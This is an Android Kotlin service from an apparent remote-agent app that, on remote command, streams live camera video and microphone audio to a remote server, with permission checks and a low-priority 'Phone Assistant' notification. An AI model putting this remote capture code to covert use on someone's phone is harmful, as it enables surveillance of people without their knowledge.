package com.kero.remoteagent

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CameraMetadata
import android.hardware.camera2.CaptureRequest
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaCodec
import android.media.MediaCodecInfo
import android.media.MediaFormat
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Base64
import android.view.Display
import android.view.Surface
import android.hardware.display.DisplayManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.nio.ByteBuffer
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit

class MediaControlService : Service() {

    companion object {
        const val ACTION_START_CAMERA = "start_camera"
        const val ACTION_START_CAMERA_FRONT = "start_camera_front"
        const val ACTION_START_CAMERA_BACK = "start_camera_back"
        const val ACTION_STOP_CAMERA = "stop_camera"
        const val ACTION_SWITCH_CAMERA = "switch_camera"
        const val ACTION_START_MIC = "start_mic"
        const val ACTION_STOP_MIC = "stop_mic"

        private const val CHANNEL_ID = "KERO_MEDIA_CHANNEL"
        private const val NOTIFICATION_ID = 1002

        @Volatile
        private var instance: MediaControlService? = null

        fun command(context: Context, action: String) {
            instance?.handleAction(action)?.let { return }

            if (action == ACTION_STOP_CAMERA || action == ACTION_STOP_MIC) return

            val intent = Intent(context, MediaControlService::class.java).apply {
                this.action = action
            }

            try {
                ContextCompat.startForegroundService(context, intent)
            } catch (e: Exception) {
                RemoteConnection.sendJson(
                    JSONObject()
                        .put("type", "media_error")
                        .put("message", e.message ?: "تعذر تشغيل خدمة الوسائط")
                )
            }
        }
    }

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null
    private var isCameraStreaming = false
    private var useFrontCamera = false
    private val cameraOpenCloseLock = Semaphore(1)

    private var videoEncoder: MediaCodec? = null
    private var encoderSurface: Surface? = null
    private var encoderThread: Thread? = null
    @Volatile private var encoderRunning = false
    private var videoWidth = 1280
    private var videoHeight = 720
    private var targetFps = 30
    private var targetFpsRange: android.util.Range<Int>? = null
    private var cameraRotationDegrees = 0
    private var cameraMirror = false
    private var usingH264 = false

    private var audioRecord: AudioRecord? = null
    private var audioThread: Thread? = null
    private var isMicStreaming = false

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        handleAction(intent?.action)
        return START_NOT_STICKY
    }

    private fun handleAction(action: String?) {
        when (action) {
            ACTION_START_CAMERA -> startCamera(false)
            ACTION_START_CAMERA_FRONT -> startCamera(true)
            ACTION_START_CAMERA_BACK -> startCamera(false)
            ACTION_STOP_CAMERA -> {
                stopCameraStream()
                stopIfIdle()
            }
            ACTION_SWITCH_CAMERA -> {
                val nextFront = !useFrontCamera
                stopCameraStream()
                startCamera(nextFront)
            }
            ACTION_START_MIC -> {
                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    sendMediaError("الميكروفون غير مسموح به")
                    return
                }
                ensureForeground(includeCamera = isCameraStreaming, includeMic = true)
                startMicStream()
            }
            ACTION_STOP_MIC -> {
                stopMicStream()
                stopIfIdle()
            }
        }
    }

    override fun onDestroy() {
        stopCameraStream()
        stopMicStream()
        instance = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun ensureForeground(includeCamera: Boolean, includeMic: Boolean) {
        val notification = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            var type = 0
            if (includeCamera) type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            if (includeMic) type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            startForeground(NOTIFICATION_ID, notification, type)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun stopIfIdle() {
        if (!isCameraStreaming && !isMicStreaming) {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }
    }

    private fun sendMediaError(message: String) {
        RemoteConnection.sendJson(
            JSONObject().put("type", "media_error").put("message", message)
        )
    }

    private fun startCamera(front: Boolean) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendMediaError("الكاميرا غير مسموح بها")
            return
        }

        useFrontCamera = front
        if (isCameraStreaming) stopCameraStream()

        ensureForeground(includeCamera = true, includeMic = isMicStreaming)
        isCameraStreaming = true

        cameraThread = HandlerThread("KeroCameraThread").also { it.start() }
        cameraHandler = Handler(cameraThread!!.looper)

        openCameraAndStartEncoder()
    }

    private fun stopCameraStream() {
        val wasRunning = isCameraStreaming
        isCameraStreaming = false
        closeCamera()
        stopVideoEncoder()
        imageReader?.close()
        imageReader = null
        cameraThread?.quitSafely()
        cameraThread = null
        cameraHandler = null
        if (wasRunning || usingH264) {
            RemoteConnection.sendJson(JSONObject().put("type", "camera_video_stop"))
        }
        usingH264 = false
    }

    private fun openCameraAndStartEncoder() {
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = getCameraId(manager) ?: run {
                sendMediaError("لم يتم العثور على الكاميرا")
                return
            }

            val characteristics = manager.getCameraCharacteristics(cameraId)
            val sensorOrientation =
                characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0
            cameraRotationDegrees = calculateCameraRotation(sensorOrientation)
            cameraMirror = useFrontCamera

            chooseVideoSize(manager, cameraId)
            if (!startVideoEncoder()) {
                sendMediaError("جهاز الكاميرا لا يدعم ترميز الفيديو السريع H.264")
                isCameraStreaming = false
                stopIfIdle()
                return
            }

            if (!cameraOpenCloseLock.tryAcquire(2500, TimeUnit.MILLISECONDS)) {
                throw RuntimeException("Camera lock timeout")
            }

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                cameraOpenCloseLock.release()
                return
            }

            manager.openCamera(
                cameraId,
                object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraOpenCloseLock.release()
                        cameraDevice = camera
                        createCameraVideoSession()
                    }

                    override fun onDisconnected(camera: CameraDevice) {
                        cameraOpenCloseLock.release()
                        camera.close()
                        cameraDevice = null
                        sendMediaError("تم فصل الكاميرا")
                    }

                    override fun onError(camera: CameraDevice, error: Int) {
                        cameraOpenCloseLock.release()
                        camera.close()
                        cameraDevice = null
                        sendMediaError("خطأ في الكاميرا: $error")
                    }
                },
                cameraHandler
            )
        } catch (e: Exception) {
            if (cameraOpenCloseLock.availablePermits() == 0) cameraOpenCloseLock.release()
            stopVideoEncoder()
            sendMediaError(e.message ?: "تعذر فتح الكاميرا")
        }
    }

    private fun getCameraId(manager: CameraManager): String? {
        for (id in manager.cameraIdList) {
            val characteristics = manager.getCameraCharacteristics(id)
            val facing = characteristics.get(CameraCharacteristics.LENS_FACING)
            if (useFrontCamera && facing == CameraCharacteristics.LENS_FACING_FRONT) return id
            if (!useFrontCamera && facing == CameraCharacteristics.LENS_FACING_BACK) return id
        }
        return manager.cameraIdList.firstOrNull()
    }

    private fun calculateCameraRotation(sensorOrientation: Int): Int {
        val displayManager = getSystemService(DisplayManager::class.java)
        val displayRotation = displayManager?.getDisplay(Display.DEFAULT_DISPLAY)?.rotation
            ?: Surface.ROTATION_0
        val deviceDegrees = when (displayRotation) {
            Surface.ROTATION_90 -> 90
            Surface.ROTATION_180 -> 180
            Surface.ROTATION_270 -> 270
            else -> 0
        }

        return if (useFrontCamera) {
            (sensorOrientation + deviceDegrees) % 360
        } else {
            (sensorOrientation - deviceDegrees + 360) % 360
        }
    }

    private fun chooseVideoSize(manager: CameraManager, cameraId: String) {
        val characteristics = manager.getCameraCharacteristics(cameraId)
        val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            ?: return
        val sizes = map.getOutputSizes(Surface::class.java)
        if (sizes.isNullOrEmpty()) return

        val preferred = sizes.firstOrNull { it.width == 1920 && it.height == 1080 }
            ?: sizes.firstOrNull { it.width == 1280 && it.height == 720 }
            ?: sizes.filter { it.width <= 1920 && it.height <= 1080 }
                .maxByOrNull { it.width * it.height }
            ?: sizes.first()

        videoWidth = preferred.width
        videoHeight = preferred.height

        val ranges = characteristics.get(CameraCharacteristics.CONTROL_AE_AVAILABLE_TARGET_FPS_RANGES)
            ?: emptyArray<android.util.Range<Int>>()
        targetFpsRange = when {
            videoWidth <= 1280 && ranges.any { it.lower <= 60 && it.upper >= 60 } ->
                ranges.first { it.lower <= 60 && it.upper >= 60 && it.lower >= 30 }
            ranges.any { it.lower <= 30 && it.upper >= 30 } ->
                ranges.first { it.lower <= 30 && it.upper >= 30 }
            else -> ranges.maxByOrNull { it.upper }
        }
        targetFps = targetFpsRange?.upper?.coerceAtMost(if (videoWidth <= 1280) 60 else 30)
            ?: 30
    }

    private fun startVideoEncoder(): Boolean {
        return try {
            val format = MediaFormat.createVideoFormat("video/avc", videoWidth, videoHeight).apply {
                setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface)
                setInteger(MediaFormat.KEY_BIT_RATE, if (videoWidth >= 1920) 6_000_000 else 4_000_000)
                setInteger(MediaFormat.KEY_FRAME_RATE, targetFps)
                setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1)
                try {
                    setInteger(MediaFormat.KEY_BITRATE_MODE, MediaCodecInfo.EncoderCapabilities.BITRATE_MODE_CBR)
                } catch (_: Exception) {
                }
            }

            val codec = MediaCodec.createEncoderByType("video/avc")
            codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
            encoderSurface = codec.createInputSurface()
            codec.start()
            videoEncoder = codec
            encoderRunning = true
            usingH264 = true

            encoderThread = Thread({ drainEncoder(codec) }, "KeroH264Encoder").also { it.start() }
            true
        } catch (e: Exception) {
            usingH264 = false
            encoderRunning = false
            encoderSurface?.release()
            encoderSurface = null
            videoEncoder?.release()
            videoEncoder = null
            ActivityLogger.log("H264 encoder start error: ${e.message}")
            false
        }
    }

    private fun drainEncoder(codec: MediaCodec) {
        val info = MediaCodec.BufferInfo()
        while (encoderRunning) {
            try {
                when (val index = codec.dequeueOutputBuffer(info, 10000)) {
                    MediaCodec.INFO_TRY_AGAIN_LATER -> Unit
                    MediaCodec.INFO_OUTPUT_FORMAT_CHANGED -> {
                        val format = codec.outputFormat
                        val csd0 = format.getByteBuffer("csd-0")?.let(::copyBuffer)
                        val csd1 = format.getByteBuffer("csd-1")?.let(::copyBuffer)
                        val msg = JSONObject()
                            .put("type", "camera_video_config")
                            .put("codec", "video/avc")
                            .put("width", videoWidth)
                            .put("height", videoHeight)
                            .put("fps", targetFps)
                            .put("rotation", cameraRotationDegrees)
                            .put("mirror", cameraMirror)
                        if (csd0 != null) msg.put("csd0", Base64.encodeToString(csd0, Base64.NO_WRAP))
                        if (csd1 != null) msg.put("csd1", Base64.encodeToString(csd1, Base64.NO_WRAP))
                        RemoteConnection.sendJson(msg)
                    }
                    else -> if (index >= 0) {
                        val buffer = codec.getOutputBuffer(index)
                        if (buffer != null && info.size > 0) {
                            buffer.position(info.offset)
                            buffer.limit(info.offset + info.size)
                            val payload = ByteArray(info.size)
                            buffer.get(payload)

                            val packet = ByteArray(13 + payload.size)
                            packet[0] = 0x48.toByte()
                            ByteBuffer.wrap(packet, 1, 4).putInt(info.flags)
                            ByteBuffer.wrap(packet, 5, 8).putLong(info.presentationTimeUs)
                            System.arraycopy(payload, 0, packet, 13, payload.size)
                            RemoteConnection.sendBinary(packet)
                        }
                        codec.releaseOutputBuffer(index, false)
                    }
                }
            } catch (e: Exception) {
                if (encoderRunning) {
                    ActivityLogger.log("H264 drain error: ${e.message}")
                }
            }
        }
    }

    private fun copyBuffer(source: ByteBuffer): ByteArray {
        val dup = source.duplicate()
        val bytes = ByteArray(dup.remaining())
        dup.get(bytes)
        return bytes
    }

    private fun createCameraVideoSession() {
        val device = cameraDevice ?: return
        val surface = encoderSurface ?: return

        try {
            device.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        if (!isCameraStreaming || cameraDevice == null) return
                        captureSession = session
                        val request = device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                            addTarget(surface)
                            set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                            targetFpsRange?.let {
                                set(CaptureRequest.CONTROL_AE_TARGET_FPS_RANGE, it)
                            }
                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_VIDEO)
                        }.build()
                        session.setRepeatingRequest(request, null, cameraHandler)
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        sendMediaError("تعذر إعداد جلسة فيديو الكاميرا")
                    }
                },
                cameraHandler
            )
        } catch (e: Exception) {
            sendMediaError(e.message ?: "تعذر بدء بث الفيديو")
        }
    }

    private fun closeCamera() {
        try {
            cameraOpenCloseLock.acquire()
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null
            imageReader?.close()
            imageReader = null
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
        } finally {
            if (cameraOpenCloseLock.availablePermits() == 0) cameraOpenCloseLock.release()
        }
    }

    private fun stopVideoEncoder() {
        encoderRunning = false
        try {
            videoEncoder?.signalEndOfInputStream()
        } catch (_: Exception) {
        }
        try {
            encoderThread?.join(700)
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
        }
        encoderThread = null
        try {
            videoEncoder?.stop()
        } catch (_: Exception) {
        }
        try {
            videoEncoder?.release()
        } catch (_: Exception) {
        }
        videoEncoder = null
        try {
            encoderSurface?.release()
        } catch (_: Exception) {
        }
        encoderSurface = null
    }

    private fun startMicStream() {
        if (isMicStreaming) return

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            sendMediaError("الميكروفون غير مسموح به")
            return
        }

        val minBuffer = AudioRecord.getMinBufferSize(
            16000,
            AudioFormat.CHANNEL_IN_MONO,
            AudioFormat.ENCODING_PCM_16BIT
        )
        if (minBuffer <= 0) {
            sendMediaError("تعذر تجهيز الميكروفون")
            return
        }

        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.MIC,
            16000,
            AudioFormat.CHANNEL_IN_MONO,
            AudioFormat.ENCODING_PCM_16BIT,
            minBuffer * 2
        )

        audioRecord?.startRecording()
        isMicStreaming = true

        audioThread = Thread {
            val buffer = ByteArray(minBuffer)
            while (isMicStreaming) {
                val read = audioRecord?.read(buffer, 0, buffer.size) ?: -1
                if (read > 0) {
                    val frame = ByteArray(read + 1)
                    frame[0] = 0x41.toByte()
                    System.arraycopy(buffer, 0, frame, 1, read)
                    RemoteConnection.sendBinary(frame)
                }
            }
        }.also { it.start() }
    }

    private fun stopMicStream() {
        isMicStreaming = false
        try {
            audioRecord?.stop()
        } catch (_: Exception) {
        }
        audioRecord?.release()
        audioRecord = null
        audioThread = null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java).createNotificationChannel(
                NotificationChannel(
                    CHANNEL_ID,
                    "Phone Assistant Media",
                    NotificationManager.IMPORTANCE_LOW
                )
            )
        }
    }

    private fun buildNotification(): Notification {
        return Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("Phone Assistant")
            .setContentText("الكاميرا أو الميكروفون قيد التشغيل")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
            .build()
    }
}
